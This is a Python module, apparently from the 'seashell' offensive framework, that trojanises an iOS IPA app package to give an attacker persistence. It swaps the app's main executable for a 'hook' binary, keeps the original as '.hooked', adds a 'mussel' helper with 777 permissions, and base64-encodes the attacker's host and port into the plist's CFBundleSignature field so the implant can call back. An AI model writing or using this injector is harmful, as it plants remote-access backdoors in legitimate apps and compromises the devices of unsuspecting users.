import os
import shutil
import plistlib

from alive_progress import alive_bar
from typing import Optional
from pex.string import String

from config import Config


class Hook(object):
    """ Subclass of seashell.core module.

    This subclass of seashell.core module is intended for providing
    an implementation a persistence for a poor man.
    """

    def __init__(self, host: Optional[str] = None,
                 port: Optional[int] = None,
                 uuid: Optional[str] = None) -> None:
        """ Initialize device hook.

        :param Optional[str] host: host
        :param Optional[int] port: port
        :param Optional[str] uuid: custom user-defined UUID
        :return None: None
        """

        self.config = Config()

        if host and port:
            if uuid:
                self.hash = String().base64_string(
                    f'{host}:{str(port)}:{uuid}', decode=True)
            else:
                self.hash = String().base64_string(
                    f'{host}:{str(port)}', decode=True)
        else:
            self.hash = ''

        self.main = self.config.data_path + 'hook'
        self.mussel = self.config.data_path + 'Mussel.app/mussel'

    def patch_ipa(self, path: str) -> None:
        """ Patch existing IPA.

        :param str path: path to IPA file
        :return None: None
        """

        with alive_bar(monitor=False, stats=False, ctrl_c=False, receipt=False,
                       title="Patching {}".format(path)) as _:
            shutil.unpack_archive(path, format='zip')
            app_files = [file for file in os.listdir('Payload') if file.endswith('.app')]

            if not app_files:
                return

            bundle = '/'.join(('Payload', app_files[0] + '/'))
            executable = self.get_executable(bundle + 'Info.plist')

            self.patch_plist(bundle + 'Info.plist')

            shutil.move(bundle + executable, bundle + executable + '.hooked')
            shutil.copy(self.main, bundle + executable)
            shutil.copy(self.mussel, bundle + 'mussel')

            os.chmod(bundle + executable, 777)
            os.chmod(bundle + 'mussel', 777)

            app = path[:-4]
            os.remove(path)

            os.mkdir(app)
            shutil.move('Payload', app)
            shutil.make_archive(path, 'zip', app)
            shutil.move(path + '.zip', path)
            shutil.rmtree(app)

    @staticmethod
    def get_executable(path: str) -> str:
        """ Get CFBundleExecutable path from plist.

        :param str path: path to plist to parse
        :return str: content of CFBundleExecutable
        """

        with open(path, 'rb') as f:
            plist_data = plistlib.load(f)

        if 'CFBundleExecutable' in plist_data:
            return plist_data['CFBundleExecutable']

        return ''

    def patch_plist(self, path: str, revert: bool = False) -> None:
        """ Patch plist file and insert object.

        :param str path: path to plist to patch
        :param bool revert: revert
        :return None: None
        """

        with open(path, 'rb') as f:
            plist_data = plistlib.load(f)

        if not revert:
            plist_data['CFBundleSignature'] = self.hash
        else:
            plist_data['CFBundleSignature'] = '????'

        with open(path, 'wb') as f:
            plistlib.dump(plist_data, f)
